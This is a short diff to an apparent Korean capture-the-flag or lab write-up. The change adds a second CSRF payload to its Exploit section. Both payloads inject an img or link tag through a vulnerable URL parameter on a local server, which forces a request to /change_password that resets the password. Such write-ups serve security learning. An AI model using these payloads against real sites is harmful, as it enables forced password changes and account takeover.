@@ -10,4 +10,6 @@ Analysis)
 
 Exploit) 
 - flag 페이지에서 change_password 페이지를 요청해 pw 값 변경
-   => http://127.0.0.1:8000/vuln?param=<img src="/change_password?pw=admin">
+   => 1) http://127.0.0.1:8000/vuln?param=<img src="/change_password?pw=admin">
+      2) http://127.0.0.1:8000/vuln?param=<link rel="stylesheet" href="/change_password?pw=guest">
+   
